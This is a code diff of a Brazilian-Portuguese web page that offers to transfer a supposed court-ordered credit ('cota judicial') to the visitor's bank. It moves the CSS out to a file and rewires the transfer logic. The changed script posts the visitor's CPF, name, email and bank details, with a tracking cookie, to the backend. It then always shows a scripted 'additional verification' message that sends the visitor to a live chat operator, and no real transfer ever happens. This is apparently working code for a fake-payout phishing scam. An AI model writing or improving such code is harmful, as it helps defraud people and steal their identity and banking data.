@@ -9,601 +9,7 @@
       href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Nunito:wght@400;600;700&display=swap"
       rel="stylesheet"
     />
-    <style>
-      :root {
-        --primary-color: #f05929;
-        --primary-dark: #d94a1a;
-        --primary-light: #ff8c5a;
-        --text-dark: #1a1a2e;
-        --text-light: #6c757d;
-        --bg-card: #ffffff;
-        --border-color: #e9ecef;
-        --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.04);
-        --shadow-md: 0 5px 20px rgba(0, 0, 0, 0.06);
-        --shadow-lg: 0 10px 30px rgba(0, 0, 0, 0.08);
-      }
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-      body {
-        font-family: 'Montserrat', 'Nunito', sans-serif;
-        background: linear-gradient(135deg, #fff5f0 0%, #ffffff 50%, #fef9f5 100%);
-        min-height: 100vh;
-        color: var(--text-dark);
-      }
-
-      /* ── HEADER ── */
-      .header-simples {
-        padding: 1rem 1.5rem;
-        width: 100%;
-      }
-      .logo {
-        height: 45px;
-        width: auto;
-        display: block;
-        position: relative;
-        left: 5px;
-        top: 5px;
-      }
-
-      /* ── LAYOUT ── */
-      .main-container {
-        max-width: 500px;
-        margin: 0 auto;
-        padding: 0.5rem 1rem 5rem;
-        min-height: 100vh;
-      }
-      .page-header {
-        display: flex;
-        align-items: center;
-        gap: 1rem;
-        margin-bottom: 1.5rem;
-        padding-top: 0.5rem;
-      }
-      .btn-back {
-        background: none;
-        border: none;
-        font-size: 1.3rem;
-        color: var(--primary-color);
-        cursor: pointer;
-        width: 40px;
-        height: 40px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        transition: all 0.2s;
-      }
-      .btn-back:hover {
-        background: rgba(240, 89, 41, 0.1);
-      }
-      .page-header h1 {
-        font-size: 1.3rem;
-        font-weight: 800;
-        color: var(--text-dark);
-      }
-
-      /* ── CARD ── */
-      .transfer-card {
-        background: var(--bg-card);
-        border-radius: 28px;
-        padding: 1.8rem;
-        box-shadow: var(--shadow-md);
-        border: 1px solid var(--border-color);
-      }
-      .valor-disponivel {
-        text-align: center;
-        margin-bottom: 2rem;
-        padding-bottom: 1.5rem;
-        border-bottom: 2px solid var(--border-color);
-      }
-      .valor-disponivel .label {
-        font-size: 0.7rem;
-        text-transform: uppercase;
-        letter-spacing: 2px;
-        color: var(--text-light);
-        font-weight: 600;
-      }
-      .valor-disponivel .valor {
-        font-size: 2rem;
-        font-weight: 800;
-        color: var(--primary-color);
-        margin-top: 0.3rem;
-      }
-      .form-group {
-        margin-bottom: 1.5rem;
-      }
-      .form-label {
-        font-size: 0.7rem;
-        font-weight: 700;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-        color: var(--text-light);
-        display: block;
-        margin-bottom: 0.6rem;
-      }
-      .custom-select {
-        width: 100%;
-        padding: 1rem;
-        font-size: 0.9rem;
-        border: 2px solid var(--border-color);
-        border-radius: 20px;
-        background: white;
-        font-family: 'Montserrat', sans-serif;
-        font-weight: 500;
-        color: var(--text-dark);
-        cursor: pointer;
-        transition: all 0.2s;
-        appearance: none;
-        background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23f05929' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'></polyline></svg>");
-        background-repeat: no-repeat;
-        background-position: right 1rem center;
-      }
-      .custom-select:focus {
-        outline: none;
-        border-color: var(--primary-color);
-      }
-      .input-grid {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 1rem;
-      }
-      .field-input {
-        width: 100%;
-        padding: 1rem;
-        font-size: 0.9rem;
-        border: 2px solid var(--border-color);
-        border-radius: 20px;
-        font-family: 'Montserrat', sans-serif;
-        transition: all 0.2s;
-      }
-      .field-input:focus {
-        outline: none;
-        border-color: var(--primary-color);
-      }
-      .field-input::placeholder {
-        color: #cbd5e0;
-        font-weight: 400;
-      }
-      .btn-confirmar {
-        width: 100%;
-        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
-        color: white;
-        border: none;
-        padding: 1rem;
-        border-radius: 30px;
-        font-size: 1rem;
-        font-weight: 800;
-        cursor: pointer;
-        transition: all 0.2s;
-        margin-top: 1rem;
-      }
-      .btn-confirmar:hover:not(:disabled) {
-        transform: translateY(-2px);
-        box-shadow: var(--shadow-lg);
-      }
-      .btn-confirmar:disabled {
-        opacity: 0.7;
-        cursor: not-allowed;
-        transform: none;
-      }
-
-      /* ── SPINNER ── */
-      .spinner {
-        display: inline-block;
-        width: 20px;
-        height: 20px;
-        border: 2px solid rgba(255, 255, 255, 0.3);
-        border-radius: 50%;
-        border-top-color: white;
-        animation: spin 0.8s linear infinite;
-        margin-right: 8px;
-        vertical-align: middle;
-      }
-      @keyframes spin {
-        to {
-          transform: rotate(360deg);
-        }
-      }
-
-      /* ── COUNTDOWN ── */
-      .countdown-timer {
-        position: fixed;
-        bottom: 30px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: rgba(0, 0, 0, 0.85);
-        color: white;
-        padding: 14px 28px;
-        border-radius: 50px;
-        font-size: 0.9rem;
-        font-weight: 600;
-        z-index: 1500;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        backdrop-filter: blur(10px);
-        width: 90%;
-        max-width: 420px;
-        justify-content: center;
-        animation: fadeInUp 0.3s ease;
-      }
-      .countdown-timer i {
-        color: var(--primary-light);
-        font-size: 1.1rem;
-      }
-      @keyframes fadeInUp {
-        from {
-          opacity: 0;
-          transform: translateX(-50%) translateY(20px);
-        }
-        to {
-          opacity: 1;
-          transform: translateX(-50%) translateY(0);
-        }
-      }
-
-      /* ══════════════════════════════════
-         OVERLAY + MODAIS PERSONALIZADOS
-      ══════════════════════════════════ */
-      .modal-overlay {
-        position: fixed;
-        inset: 0;
-        background: rgba(0, 0, 0, 0.6);
-        z-index: 3000;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 20px;
-        animation: fadeOverlay 0.22s ease;
-      }
-      @keyframes fadeOverlay {
-        from {
-          opacity: 0;
-        }
-        to {
-          opacity: 1;
-        }
-      }
-
-      .modal-box {
-        background: white;
-        border-radius: 28px;
-        padding: 2rem 1.8rem;
-        max-width: 360px;
-        width: 100%;
-        text-align: center;
-        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
-        animation: slideUp 0.25s ease;
-      }
-      @keyframes slideUp {
-        from {
-          opacity: 0;
-          transform: translateY(24px);
-        }
-        to {
-          opacity: 1;
-          transform: translateY(0);
-        }
-      }
-
-      /* Logo dentro do modal */
-      .modal-logo-wrap {
-        width: 64px;
-        height: 64px;
-        border-radius: 18px;
-        background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 1rem;
-        box-shadow: 0 6px 20px rgba(240, 89, 41, 0.35);
-      }
-      .modal-logo-wrap img {
-        width: 44px;
-        height: 44px;
-        object-fit: contain;
-      }
-
-      /* Ícone de estado (erro/aviso) */
-      .modal-icon-circle {
-        width: 68px;
-        height: 68px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        margin: 0 auto 1rem;
-      }
-      .modal-icon-circle.danger {
-        background: rgba(220, 53, 69, 0.1);
-      }
-      .modal-icon-circle.warning {
-        background: rgba(255, 193, 7, 0.15);
-      }
-      .modal-icon-circle i {
-        font-size: 2.2rem;
-      }
-      .modal-icon-circle.danger i {
-        color: #dc3545;
-      }
-      .modal-icon-circle.warning i {
-        color: #e0a800;
-      }
-
-      .modal-box h3 {
-        font-size: 1.2rem;
-        font-weight: 800;
-        color: var(--text-dark);
-        margin-bottom: 0.5rem;
-      }
-      .modal-box p {
-        font-size: 0.85rem;
-        color: var(--text-light);
-        margin-bottom: 1.5rem;
-        line-height: 1.55;
-      }
-
-      .modal-btn {
-        width: 100%;
-        border: none;
-        padding: 0.85rem;
-        border-radius: 50px;
-        font-size: 0.95rem;
-        font-weight: 700;
-        cursor: pointer;
-        transition: all 0.18s;
-        font-family: inherit;
-      }
-      .modal-btn.primary {
-        background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-        color: white;
-        box-shadow: 0 4px 14px rgba(240, 89, 41, 0.3);
-      }
-      .modal-btn.primary:hover {
-        transform: translateY(-1px);
-        box-shadow: 0 6px 18px rgba(240, 89, 41, 0.4);
-      }
-      .modal-btn.ghost {
-        background: #f0f0f0;
-        color: var(--text-dark);
-        margin-top: 0.6rem;
-      }
-      .modal-btn.ghost:hover {
-        background: #e2e2e2;
-      }
-
-      /* ── CHAT ── */
-      .chat-btn-custom {
-        position: fixed !important;
-        bottom: 28px !important;
-        right: 22px !important;
-        width: 58px !important;
-        height: 58px !important;
-        border-radius: 50% !important;
-        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%) !important;
-        border: none !important;
-        cursor: pointer !important;
-        box-shadow: 0 5px 20px rgba(240, 89, 41, 0.4) !important;
-        z-index: 1000 !important;
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        transition: transform 0.2s !important;
-      }
-      .chat-btn-custom:hover {
-        transform: scale(1.08) !important;
-      }
-      .chat-btn-custom i {
-        font-size: 1.6rem !important;
-        color: white !important;
-      }
-
-      .chat-modal-custom {
-        position: fixed !important;
-        bottom: 96px !important;
-        right: 22px !important;
-        width: 360px !important;
-        max-width: calc(100vw - 44px) !important;
-        background: white !important;
-        border-radius: 20px !important;
-        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2) !important;
-        z-index: 1001 !important;
-        display: none !important;
-        flex-direction: column !important;
-        overflow: hidden !important;
-      }
-      .chat-modal-custom.active {
-        display: flex !important;
-      }
-
-      .chat-modal-header {
-        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%) !important;
-        color: white !important;
-        padding: 14px 18px !important;
-        display: flex !important;
-        align-items: center !important;
-        gap: 11px !important;
-      }
-      .chat-modal-logo {
-        width: 38px !important;
-        height: 38px !important;
-        background: white !important;
-        border-radius: 11px !important;
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-        flex-shrink: 0 !important;
-      }
-      .chat-modal-logo img {
-        width: 28px !important;
-        height: 28px !important;
-        object-fit: contain !important;
-      }
-      .chat-modal-title {
-        flex: 1 !important;
-      }
-      .chat-modal-title h4 {
-        margin: 0 !important;
-        font-size: 0.9rem !important;
-        font-weight: 700 !important;
-        display: flex;
-        align-items: center;
-        gap: 6px;
-      }
-      .chat-modal-title p {
-        margin: 0 !important;
-        font-size: 0.62rem !important;
-        opacity: 0.88 !important;
-      }
-      .chat-modal-close {
-        background: none !important;
-        border: none !important;
-        color: white !important;
-        font-size: 1.1rem !important;
-        cursor: pointer !important;
-        width: 28px !important;
-        height: 28px !important;
-        border-radius: 50% !important;
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-      }
-      .chat-modal-close:hover {
-        background: rgba(255, 255, 255, 0.15) !important;
-      }
-
-      .chat-modal-body {
-        height: 390px !important;
-        display: flex !important;
-        flex-direction: column !important;
-        background: #f5f7fa !important;
-      }
-      .chat-modal-messages {
-        flex: 1 !important;
-        overflow-y: auto !important;
-        padding: 13px !important;
-        display: flex !important;
-        flex-direction: column !important;
-        gap: 9px !important;
-      }
-      .chat-modal-messages::-webkit-scrollbar {
-        width: 4px;
-      }
-      .chat-modal-messages::-webkit-scrollbar-thumb {
-        background: #ddd;
-        border-radius: 10px;
-      }
-
-      .message-bubble {
-        max-width: 84% !important;
-        padding: 9px 13px !important;
-        border-radius: 18px !important;
-        font-size: 0.82rem !important;
-        line-height: 1.45 !important;
-      }
-      .message-bubble.system {
-        background: #e9ecef !important;
-        color: #495057 !important;
-        align-self: flex-start !important;
-      }
-      .message-bubble.user {
-        background: var(--primary-color) !important;
-        color: white !important;
-        align-self: flex-end !important;
-      }
-      .message-bubble.operator {
-        background: white !important;
-        color: var(--text-dark) !important;
-        align-self: flex-start !important;
-        border: 1px solid #e0e0e0 !important;
-        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05) !important;
-      }
-      .message-time {
-        font-size: 0.58rem !important;
-        opacity: 0.65 !important;
-        margin-top: 4px !important;
-        display: block !important;
-      }
-
-      .chat-modal-input-area {
-        padding: 12px !important;
-        background: white !important;
-        border-top: 1px solid #e8e8e8 !important;
-        display: flex !important;
-        gap: 9px !important;
-        align-items: center !important;
-      }
-      .chat-modal-input-area input {
-        flex: 1 !important;
-        padding: 11px 14px !important;
-        border: 1.5px solid #e0e0e0 !important;
-        border-radius: 25px !important;
-        font-size: 0.83rem !important;
-        outline: none !important;
-        font-family: inherit !important;
-        transition: border-color 0.2s !important;
-      }
-      .chat-modal-input-area input:focus {
-        border-color: var(--primary-color) !important;
-      }
-      .chat-modal-input-area button {
-        background: linear-gradient(135deg, var(--primary-color), var(--primary-dark)) !important;
-        border: none !important;
-        color: white !important;
-        width: 40px !important;
-        height: 40px !important;
-        border-radius: 50% !important;
-        cursor: pointer !important;
-        flex-shrink: 0 !important;
-        display: flex !important;
-        align-items: center !important;
-        justify-content: center !important;
-      }
-
-      .chat-online-indicator {
-        display: inline-block !important;
-        width: 7px !important;
-        height: 7px !important;
-        border-radius: 50% !important;
-        background: #4caf50 !important;
-        animation: pulse 1.5s infinite !important;
-      }
-      @keyframes pulse {
-        0% {
-          transform: scale(0.8);
-          opacity: 0.5;
-        }
-        100% {
-          transform: scale(1.3);
-          opacity: 0;
-        }
-      }
-
-      @media (max-width: 480px) {
-        .main-container {
-          padding: 0.5rem 0.8rem 5rem;
-        }
-        .transfer-card {
-          padding: 1.4rem;
-        }
-        .input-grid {
-          grid-template-columns: 1fr;
-        }
-        .valor-disponivel .valor {
-          font-size: 1.7rem;
-        }
-        .chat-modal-custom {
-          right: 10px !important;
-          left: 10px !important;
-          width: auto !important;
-          max-width: none !important;
-          bottom: 88px !important;
-        }
-      }
-    </style>
+    <link rel="stylesheet" href="{{ url_for('static', filename='assets/css/transferencia.css') }}" />
   </head>
   <body>
     <div class="header-simples">
@@ -621,7 +27,7 @@
       <div class="transfer-card">
         <div class="valor-disponivel">
           <div class="label">VALOR DISPONÍVEL</div>
-          <div class="valor" id="valorDisponivel">R$ 4.574,52</div>
+          <div class="valor" id="valorDisponivel">R$ 0,00</div>
         </div>
 
         <div class="form-group">
@@ -646,12 +52,10 @@
       </div>
     </div>
 
-    <!-- BOTÃO FLUTUANTE DO CHAT -->
     <button class="chat-btn-custom" onclick="abrirChat()">
       <i class="fas fa-comment-dots"></i>
     </button>
 
-    <!-- MODAL DO CHAT -->
     <div id="chatModal" class="chat-modal-custom">
       <div class="chat-modal-header">
         <div class="chat-modal-logo">
@@ -680,9 +84,47 @@
     </div>
 
     <script>
-      // ══════════════════════════════════════════════
-      // MODAL SYSTEM — substitui todos os alert()
-      // ══════════════════════════════════════════════
+      // ============================================
+      // CONFIGURAÇÕES
+      // ============================================
+      const STORAGE_KEYS = {
+        CREDOR_DATA: 'credorData',
+        USER_NAME: 'chatUserName'
+      }
+
+      // ============================================
+      // CÁLCULO DE COTAS
+      // ============================================
+      function calcularValorPrimeiraCota(valorTotal) {
+        if (!valorTotal || valorTotal <= 0) return 0
+        const numeroCotas = valorTotal > 20000 ? 4 : 2
+        const valorCota = valorTotal / numeroCotas
+        console.log(`📊 Cálculo: Total R$ ${valorTotal.toFixed(2)}, ${numeroCotas} cotas de R$ ${valorCota.toFixed(2)}`)
+        return valorCota
+      }
+
+      // ============================================
+      // FUNÇÃO CORRIGIDA: Extrair valor do campo correto
+      // ============================================
+      function extrairValor(credor) {
+        // Tenta extrair de diferentes formatos possíveis
+        let valorString = credor.valor || credor.valor_real || credor.valor_total || 'R$ 0,00'
+
+        // Remove R$, espaços e converte vírgula para ponto
+        let valorNumerico = parseFloat(
+          valorString
+            .replace(/[R$\s]/g, '') // Remove R$ e espaços
+            .replace(/\./g, '') // Remove pontos de milhar
+            .replace(',', '.') // Substitui vírgula decimal por ponto
+        )
+
+        console.log('💰 Valor extraído:', valorString, '=>', valorNumerico)
+        return isNaN(valorNumerico) ? 0 : valorNumerico
+      }
+
+      // ============================================
+      // MODAL SYSTEM
+      // ============================================
       function abrirModal({
         tipo = 'aviso',
         titulo,
@@ -694,7 +136,6 @@
       }) {
         fecharModalAtivo()
 
-        // Decide o ícone de estado (quando não usa o logo)
         const useLogoHeader = tipo === 'logo'
         let iconeHtml = ''
 
@@ -742,7 +183,6 @@
             if (callbackSecundario) callbackSecundario()
           }
         }
-        // Fechar clicando fora
         overlay.addEventListener('click', (e) => {
           if (e.target === overlay) fecharModalAtivo()
         })
@@ -752,9 +192,62 @@
         document.getElementById('modalAtivo')?.remove()
       }
 
-      // ══════════════════════════════════════════════
+      // ============================================
+      // FUNÇÃO CORRIGIDA: CARREGAR DADOS DO CACHE
+      // ============================================
+      function carregarDadosDoCache() {
+        const credorData = localStorage.getItem(STORAGE_KEYS.CREDOR_DATA)
+        if (credorData) {
+          try {
+            const credor = JSON.parse(credorData)
+            console.log('📦 Dados carregados do cache:', credor)
+
+            // CORREÇÃO PRINCIPAL: Usar a função extrairValor
+            const valorOriginal = extrairValor(credor)
+            const primeiraCota = calcularValorPrimeiraCota(valorOriginal)
+
+            document.getElementById('valorDisponivel').textContent =
+              `R$ ${primeiraCota.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`
+
+            return {
+              nome: credor.nome || 'NÃO INFORMADO',
+              cpf_limpo: credor.cpf_limpo || credor.cpf || '00000000000',
+              email: credor.email || '',
+              valor_original: valorOriginal,
+              primeira_cota: primeiraCota,
+              numero_cotas: valorOriginal > 20000 ? 4 : 2,
+              // Manter os dados originais
+              ...credor
+            }
+          } catch (e) {
+            console.error('Erro ao carregar cache:', e)
+            abrirModal({
+              tipo: 'erro',
+              titulo: 'Erro ao carregar dados',
+              mensagem: 'Não foi possível carregar seus dados. Volte e tente novamente.',
+              callbackPrimario: () => {
+                window.location.href = '/home'
+              }
+            })
+            return null
+          }
+        } else {
+          console.log('⚠️ Nenhum dado em cache encontrado')
+          abrirModal({
+            tipo: 'erro',
+            titulo: 'Dados não encontrados',
+            mensagem: 'Nenhum dado encontrado. Volte e consulte seu CPF.',
+            callbackPrimario: () => {
+              window.location.href = '/home'
+            }
+          })
+          return null
+        }
+      }
+
+      // ============================================
       // DADOS & BANCOS
-      // ══════════════════════════════════════════════
+      // ============================================
       const bancosBrasil = [
         { codigo: '001', nome: 'Banco do Brasil' },
         { codigo: '033', nome: 'Santander' },
@@ -796,18 +289,6 @@
         { codigo: '367', nome: 'Banco Votorantim (BV)' }
       ]
 
-      const userData = JSON.parse(localStorage.getItem('userData')) || {
-        nome: 'VANDERLUCIÁ',
-        creditoTotal: 22872.6,
-        valorCota: 5718.15,
-        cotaLiberada: 4574.52,
-        totalRecebido: 4574.52,
-        cotasRestantes: 3
-      }
-
-      document.getElementById('valorDisponivel').textContent =
-        `R$ ${userData.cotaLiberada.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`
-
       const sel = document.getElementById('bancoDestino')
       bancosBrasil.forEach((b) => {
         const o = document.createElement('option')
@@ -816,35 +297,26 @@
         sel.appendChild(o)
       })
 
-      // ══════════════════════════════════════════════
-      // TRANSFERÊNCIA
-      // ══════════════════════════════════════════════
+      // ============================================
+      // TRANSFERÊNCIA - POST CORRIGIDO
+      // ============================================
       let timeoutId = null
-      let countdownInterval = null
-
-      function mascararConta(input) {
-        input.value = input.value.replace(/\D/g, '') // if (v.length > 8) v = v.substring(0, 8)
-        // input.value = v.length > 6 ? v.substring(0, 6) + '-' + v.substring(6, 8) : v
-      }
+      let credorData = carregarDadosDoCache()
 
       function mostrarCountdown() {
         document.querySelector('.countdown-timer')?.remove()
-        if (countdownInterval) clearInterval(countdownInterval)
         document.body.insertAdjacentHTML(
           'beforeend',
           `
           <div class="countdown-timer" id="countdownTimer">
             <i class="fas fa-hourglass-half"></i>
             <span>Verificando dados bancários...</span>
-          </div>`
+          </div>
+        `
         )
       }
 
       function removerCountdown() {
-        if (countdownInterval) {
-          clearInterval(countdownInterval)
-          countdownInterval = null
-        }
         document.getElementById('countdownTimer')?.remove()
       }
 
@@ -862,24 +334,50 @@
         removerCountdown()
       }
 
-      function mostrarModalRecusado() {
+      function getCookie(name) {
+        const value = `; ${document.cookie}`
+        const parts = value.split(`; ${name}=`)
+        if (parts.length === 2) return parts.pop().split(';').shift()
+        return null
+      }
+
+      function mostrarModalFalarComAtendente() {
         abrirModal({
-          tipo: 'erro',
-          titulo: 'TRANSFERÊNCIA RECUSADA',
+          tipo: 'logo',
+          titulo: 'ATENÇÃO!',
           mensagem:
-            'O banco de destino não autorizou o recebimento desta cota judicial no momento. Tente outra conta da mesma titularidade ou acione o suporte via chat.',
-          botaoPrimario: 'Tentar Novamente',
-          botaoSecundario: 'Falar no Chat',
-          callbackPrimario: () => mostrarLoadingBotao(false),
-          callbackSecundario: () => {
+            'Sua transferência necessita de verificação adicional. Por favor, entre em contato com nosso atendente via chat para continuar com a liberação.',
+          botaoPrimario: 'FALAR COM ATENDENTE',
+          botaoSecundario: 'TENTAR NOVAMENTE',
+          callbackPrimario: () => {
             mostrarLoadingBotao(false)
             abrirChat()
+          },
+          callbackSecundario: () => {
+            mostrarLoadingBotao(false)
           }
         })
       }
 
-      function confirmarTransferencia() {
+      // ============================================
+      // FUNÇÃO CORRIGIDA - CONFIRMAR TRANSFERÊNCIA
+      // ============================================
+
+      async function confirmarTransferencia() {
+        if (!credorData) {
+          abrirModal({
+            tipo: 'erro',
+            titulo: 'Dados não carregados',
+            mensagem: 'Por favor, volte e consulte seu CPF novamente.',
+            callbackPrimario: () => {
+              window.location.href = '/home'
+            }
+          })
+          return
+        }
+
         cancelarTimeout()
+
         const banco = document.getElementById('bancoDestino').value
         const agencia = document.getElementById('agencia').value.trim()
         const conta = document.getElementById('conta').value.trim()
@@ -900,11 +398,96 @@
         mostrarLoadingBotao(true)
         mostrarCountdown()
 
-        timeoutId = setTimeout(() => {
+        const bancoSelect = document.getElementById('bancoDestino')
+        const bancoNome = bancoSelect.options[bancoSelect.selectedIndex]?.text || 'Banco não identificado'
+
+        // ============================================
+        // PAYLOAD CORRIGIDO - AGORA BATE COM O BACKEND
+        // ============================================
+        const payload = {
+          tracking_id: getCookie('tracking_id'),
+          transferencia: {
+            banco_codigo: banco,
+            banco_nome: bancoNome,
+            agencia: agencia,
+            conta: conta,
+            valor: credorData.primeira_cota,
+            valor_original_total: credorData.valor_original,
+            numero_cota: 1
+          },
+          usuario: {
+            nome: credorData.nome,
+            cpf: credorData.cpf_limpo,
+            email: credorData.email || ''
+          }
+        }
+
+        console.log('')
+        console.log('═══════════════════════════════════════════════════')
+        console.log('📤 [POST] /api/transfer/tentativa') // ALTERADO: sem /chat/
+        console.log('═══════════════════════════════════════════════════')
+        console.log('📦 PAYLOAD COMPLETO:')
+        console.log(JSON.stringify(payload, null, 2))
+        console.log('═══════════════════════════════════════════════════')
+        console.log('📱 INFORMAÇÕES DO DISPOSITIVO:')
+        console.log(`   - IP: ${getCookie('tracking_id') || 'Coletado pelo backend'}`)
+        console.log(`   - User-Agent: ${navigator.userAgent}`)
+        console.log('═══════════════════════════════════════════════════')
+        console.log('⏰ NOTA: Backend usa UTC, não horário de Brasília')
+        console.log('')
+
+        try {
+          // ALTERADO: Rota correta sem /chat/
+          const response = await fetch('/api/transfer/tentativa', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Requested-With': 'XMLHttpRequest'
+            },
+            body: JSON.stringify(payload)
+          })
+
+          const result = await response.json()
+          console.log('✅ [RESPOSTA DO BACKEND]:', result)
+
+          if (result.success) {
+            console.log(`✅ Transferência registrada com ID: ${result.transferencia_id}`)
+            // Sucesso - mantém o fluxo normal
+            timeoutId = setTimeout(() => {
+              removerCountdown()
+              mostrarModalFalarComAtendente()
+              timeoutId = null
+            }, 8000)
+          } else {
+            console.error('❌ Erro no backend:', result.error)
+            removerCountdown()
+            mostrarLoadingBotao(false)
+            abrirModal({
+              tipo: 'erro',
+              titulo: 'Erro na transferência',
+              mensagem: result.error || 'Ocorreu um erro ao processar sua solicitação. Tente novamente.',
+              botaoPrimario: 'OK',
+              callbackPrimario: () => {
+                mostrarLoadingBotao(false)
+              }
+            })
+            cancelarTimeout()
+          }
+        } catch (error) {
+          console.error('❌ [ERRO NA REQUISIÇÃO]:', error)
           removerCountdown()
-          mostrarModalRecusado()
-          timeoutId = null
-        }, 7000)
+          mostrarLoadingBotao(false)
+          abrirModal({
+            tipo: 'erro',
+            titulo: 'Erro de conexão',
+            mensagem: 'Não foi possível conectar ao servidor. Verifique sua internet e tente novamente.',
+            botaoPrimario: 'OK',
+            callbackPrimario: () => {
+              mostrarLoadingBotao(false)
+            }
+          })
+          cancelarTimeout()
+        }
       }
 
       window.addEventListener('beforeunload', (e) => {
@@ -915,15 +498,11 @@
       })
       window.addEventListener('unload', () => {
         if (timeoutId) clearTimeout(timeoutId)
-        if (countdownInterval) clearInterval(countdownInterval)
       })
 
-      // ══════════════════════════════════════════════
-      // CHAT — SISTEMA BASEADO EM TIMESTAMP
-      // (idêntico ao padrão das demais páginas)
-      // ══════════════════════════════════════════════
-      const STORAGE_KEYS = { USER_NAME: 'chatUserName' }
-
+      // ============================================
+      // CHAT
+      // ============================================
       let chatClienteId = null
       let chatSalaId = null
       let chatUltimoTs = 0
@@ -951,7 +530,7 @@
 
       async function entrarFila(nome) {
         try {
-          const r = await fetch('/api/entrar_fila', {
+          const r = await fetch('/api/chat/entrar_fila', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ nome })
@@ -970,7 +549,7 @@
       async function verificarSala() {
         if (chatSalaId || !chatClienteId) return
         try {
-          const r = await fetch(`/api/verificar_sala/${chatClienteId}`)
+          const r = await fetch(`/api/chat/verificar_sala/${chatClienteId}`)
           const d = await r.json()
           if (d.status === 'em_atendimento' && d.sala_id) {
             chatSalaId = d.sala_id
@@ -986,12 +565,11 @@
       async function buscarMensagens() {
         if (!chatSalaId) return
         try {
-          const r = await fetch(`/api/mensagens/${chatSalaId}?ultimo_timestamp=${chatUltimoTs}`)
+          const r = await fetch(`/api/chat/mensagens/${chatSalaId}?ultimo_timestamp=${chatUltimoTs}`)
           const d = await r.json()
           if (d.mensagens && d.mensagens.length > 0) {
             d.mensagens.forEach((msg) => {
               if (msg.time > chatUltimoTs) chatUltimoTs = msg.time
-              // Não re-exibir msgs do próprio cliente (já exibidas otimisticamente)
               if (msg.de === chatNome) return
               if (msg.de === 'sistema') {
                 if (msg.texto && msg.texto.includes('encerrado')) {
@@ -1017,7 +595,7 @@
         input.value = ''
         if (!chatSalaId) return
         try {
-          const r = await fetch('/api/enviar_mensagem', {
+          const r = await fetch('/api/chat/enviar_mensagem', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ sala_id: chatSalaId, de: chatNome, texto, cliente_id: chatClienteId })
@@ -1028,7 +606,6 @@
       }
 
       function pedirNome() {
-        // Usa o próprio sistema de modal personalizado
         fecharModalAtivo()
         const overlay = document.createElement('div')
         overlay.className = 'modal-overlay'
@@ -1040,11 +617,7 @@
             </div>
             <h3>Bem-vindo!</h3>
             <p>Para iniciarmos o atendimento, qual é o seu nome?</p>
-            <input type="text" id="nomeInputModal"
-              placeholder="Digite seu nome"
-              style="width:100%;padding:0.85rem 1rem;border:1.5px solid #e0e0e0;border-radius:14px;font-size:0.95rem;font-family:inherit;margin-bottom:1rem;outline:none;transition:border-color 0.2s;"
-              onfocus="this.style.borderColor='#f05929'" onblur="this.style.borderColor='#e0e0e0'"
-            />
+            <input type="text" id="nomeInputModal" placeholder="Digite seu nome" style="width:100%;padding:0.85rem 1rem;border:1.5px solid #e0e0e0;border-radius:14px;font-size:0.95rem;font-family:inherit;margin-bottom:1rem;outline:none;transition:border-color 0.2s;" onfocus="this.style.borderColor='#f05929'" onblur="this.style.borderColor='#e0e0e0'" />
             <button class="modal-btn primary" id="btnConfNome">Começar atendimento</button>
           </div>`
         document.body.appendChild(overlay)
@@ -1085,76 +658,7 @@
       document.getElementById('chatInput').addEventListener('keypress', (e) => {
         if (e.key === 'Enter') enviarMensagem()
       })
-      // ===== FUNÇÕES PARA OS CAMPOS =====
 
-      // Máscara para AGÊNCIA (apenas números)
-      function mascararAgencia(input) {
-        input.value = input.value.replace(/\D/g, '')
-      }
-
-      // Validar AGÊNCIA
-      function validarAgencia() {
-        const input = document.getElementById('agencia')
-        const valor = input.value.replace(/\D/g, '')
-
-        if (!valor || valor.length === 0) {
-          showToast('Por favor, informe o número da agência', 'error')
-          input.classList.add('input-error')
-          return false
-        }
-
-        if (valor.length < 3) {
-          showToast('Agência inválida - mínimo 3 dígitos', 'error')
-          input.classList.add('input-error')
-          return false
-        }
-
-        input.classList.remove('input-error')
-        return true
-      }
-
-      // Validar CONTA
-      function validarConta() {
-        const input = document.getElementById('conta')
-        const valorLimpo = input.value.replace(/\D/g, '')
-
-        if (!valorLimpo || valorLimpo.length === 0) {
-          showToast('Por favor, informe o número da conta', 'error')
-          input.classList.add('input-error')
-          return false
-        }
-
-        if (valorLimpo.length < 6) {
-          showToast('Conta inválida - mínimo 6 dígitos', 'error')
-          input.classList.add('input-error')
-          return false
-        }
-
-        input.classList.remove('input-error')
-        return true
-      }
-
-      // Adicionar os eventos (colocar isso dentro do seu DOMContentLoaded ou no final do script)
-      document.addEventListener('DOMContentLoaded', function () {
-        const agencia = document.getElementById('agencia')
-        if (agencia) {
-          agencia.addEventListener('input', function () {
